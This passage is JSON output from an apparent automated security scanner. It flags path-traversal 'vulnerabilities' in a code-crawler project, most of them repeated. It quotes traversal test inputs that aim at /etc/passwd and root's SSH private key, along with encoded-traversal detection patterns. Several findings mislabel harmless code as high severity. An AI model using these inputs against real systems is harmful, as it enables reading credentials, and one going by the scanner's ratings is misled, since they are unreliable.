            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"...//...//etc/passwd\", False, \"Triple dots traversal\"),",
            "context": "                # Mixed case and creative attempts\n                (\"..%2F..%2F..%2Fetc%2Fpasswd\", False, \"Mixed case encoding\"),\n                (\"...//...//etc/passwd\", False, \"Triple dots traversal\"),\n                (\".%2e/.%2e/.%2e/etc/passwd\", False, \"Mixed dot encoding\"),\n                ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%2e%2e%2f',     # ../",
            "context": "    # Encoded path traversal patterns to detect\n    ENCODED_TRAVERSAL_PATTERNS = [\n        r'%2e%2e%2f',     # ../\n        r'%2e%2e/',       # ../\n        r'..%2f',         # ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%2e%2e%2f',     # ../",
            "context": "    # Encoded path traversal patterns to detect\n    ENCODED_TRAVERSAL_PATTERNS = [\n        r'%2e%2e%2f',     # ../\n        r'%2e%2e/',       # ../\n        r'..%2f',         # ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 54,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%2e%2e/',       # ../",
            "context": "    ENCODED_TRAVERSAL_PATTERNS = [\n        r'%2e%2e%2f',     # ../\n        r'%2e%2e/',       # ../\n        r'..%2f',         # ../\n        r'%2e%2e%5c',     # ..\\",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 54,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%2e%2e/',       # ../",
            "context": "    ENCODED_TRAVERSAL_PATTERNS = [\n        r'%2e%2e%2f',     # ../\n        r'%2e%2e/',       # ../\n        r'..%2f',         # ../\n        r'%2e%2e%5c',     # ..\\",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 55,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'..%2f',         # ../",
            "context": "        r'%2e%2e%2f',     # ../\n        r'%2e%2e/',       # ../\n        r'..%2f',         # ../\n        r'%2e%2e%5c',     # ..\\\n        r'\\.\\.%2f',       # ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 55,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'..%2f',         # ../",
            "context": "        r'%2e%2e%2f',     # ../\n        r'%2e%2e/',       # ../\n        r'..%2f',         # ../\n        r'%2e%2e%5c',     # ..\\\n        r'\\.\\.%2f',       # ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'\\.\\.%2f',       # ../",
            "context": "        r'..%2f',         # ../\n        r'%2e%2e%5c',     # ..\\\n        r'\\.\\.%2f',       # ../\n        r'\\.\\./',         # ../\n        r'\\.\\.\\\\',        # ..\\",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'\\.\\.%2f',       # ../",
            "context": "        r'..%2f',         # ../\n        r'%2e%2e%5c',     # ..\\\n        r'\\.\\.%2f',       # ../\n        r'\\.\\./',         # ../\n        r'\\.\\.\\\\',        # ..\\",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 58,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'\\.\\./',         # ../",
            "context": "        r'%2e%2e%5c',     # ..\\\n        r'\\.\\.%2f',       # ../\n        r'\\.\\./',         # ../\n        r'\\.\\.\\\\',        # ..\\\n        r'%252e%252e%252f', # Double-encoded ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 58,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'\\.\\./',         # ../",
            "context": "        r'%2e%2e%5c',     # ..\\\n        r'\\.\\.%2f',       # ../\n        r'\\.\\./',         # ../\n        r'\\.\\.\\\\',        # ..\\\n        r'%252e%252e%252f', # Double-encoded ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 60,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%252e%252e%252f', # Double-encoded ../",
            "context": "        r'\\.\\./',         # ../\n        r'\\.\\.\\\\',        # ..\\\n        r'%252e%252e%252f', # Double-encoded ../\n        r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../\n        r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 60,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%252e%252e%252f', # Double-encoded ../",
            "context": "        r'\\.\\./',         # ../\n        r'\\.\\.\\\\',        # ..\\\n        r'%252e%252e%252f', # Double-encoded ../\n        r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../\n        r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../",
            "context": "        r'\\.\\.\\\\',        # ..\\\n        r'%252e%252e%252f', # Double-encoded ../\n        r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../\n        r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../",
            "context": "        r'\\.\\.\\\\',        # ..\\\n        r'%252e%252e%252f', # Double-encoded ../\n        r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../\n        r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../\n    ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../",
            "context": "        r'%252e%252e%252f', # Double-encoded ../\n        r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../\n        r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../\n    ]\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../",
            "context": "        r'%252e%252e%252f', # Double-encoded ../\n        r'%c0%ae%c0%ae%c0%af', # UTF-8 overlong encoding ../\n        r'%e0%80%ae%e0%80%ae%e0%80%af', # UTF-8 overlong encoding ../\n    ]\n    ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 196,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):",
            "context": "                raise PathValidationError(f\"Suspicious path pattern detected: {original_input}\")\n            # Check if it's a valid relative path that doesn't escape boundaries\n            if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):\n                raise PathValidationError(f\"Path traversal attempt detected: {original_input}\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 196,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):",
            "context": "                raise PathValidationError(f\"Suspicious path pattern detected: {original_input}\")\n            # Check if it's a valid relative path that doesn't escape boundaries\n            if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):\n                raise PathValidationError(f\"Path traversal attempt detected: {original_input}\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 196,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):",
            "context": "                raise PathValidationError(f\"Suspicious path pattern detected: {original_input}\")\n            # Check if it's a valid relative path that doesn't escape boundaries\n            if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):\n                raise PathValidationError(f\"Path traversal attempt detected: {original_input}\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator.py",
            "line": 196,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):",
            "context": "                raise PathValidationError(f\"Suspicious path pattern detected: {original_input}\")\n            # Check if it's a valid relative path that doesn't escape boundaries\n            if normalized.startswith('../') or '/../' in normalized or normalized.endswith('/..'):\n                raise PathValidationError(f\"Path traversal attempt detected: {original_input}\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator_simple.py",
            "line": 101,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../',",
            "context": "        # Check for dangerous patterns\n        dangerous_patterns = [\n            '../',\n            '/..',\n            '/etc/',",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/cbc_security/path_validator_simple.py",
            "line": 101,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../',",
            "context": "        # Check for dangerous patterns\n        dangerous_patterns = [\n            '../',\n            '/..',\n            '/etc/',",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/generate_workload.py",
            "line": 468,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "f.write(\"    echo \\\"Running $workload...\\\"\\n\")",
            "context": "            f.write(\"# Run all workloads\\n\")\n            f.write(\"for workload in workload_*.json; do\\n\")\n            f.write(\"    echo \\\"Running $workload...\\\"\\n\")\n            f.write(\"    cargo test --test performance_validation -- --workload \\\"$workload\\\"\\n\")\n            f.write(\"done\\n\")",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/benchmarks/system_benchmarks.py",
            "line": 235,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(test_file, 'r+b') as f:",
            "context": "            \n            # Random write\n            with open(test_file, 'r+b') as f:\n                start = time.perf_counter()\n                for _ in range(num_operations):",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 89,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"cargo\", \"test\", \"../../../etc/passwd\"],",
            "context": "        \"\"\"Test that path traversal in arguments is blocked\"\"\"\n        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 89,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"cargo\", \"test\", \"../../../etc/passwd\"],",
            "context": "        \"\"\"Test that path traversal in arguments is blocked\"\"\"\n        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 89,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"cargo\", \"test\", \"../../../etc/passwd\"],",
            "context": "        \"\"\"Test that path traversal in arguments is blocked\"\"\"\n        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 89,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"cargo\", \"test\", \"../../../etc/passwd\"],",
            "context": "        \"\"\"Test that path traversal in arguments is blocked\"\"\"\n        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 89,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"cargo\", \"test\", \"../../../etc/passwd\"],",
            "context": "        \"\"\"Test that path traversal in arguments is blocked\"\"\"\n        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 89,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"cargo\", \"test\", \"../../../etc/passwd\"],",
            "context": "        \"\"\"Test that path traversal in arguments is blocked\"\"\"\n        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],",
            "context": "        traversal_attempts = [\n            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "context": "            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "context": "            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "context": "            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
            "context": "            [\"cargo\", \"test\", \"../../../etc/passwd\"],\n            [\"git\", \"log\", \"../../../../../../root/.ssh/id_rsa\"],\n            [\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/security/test_security_mitigations.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"python3\", \"-c\", \"open('../../../etc/hosts').read()\"],",
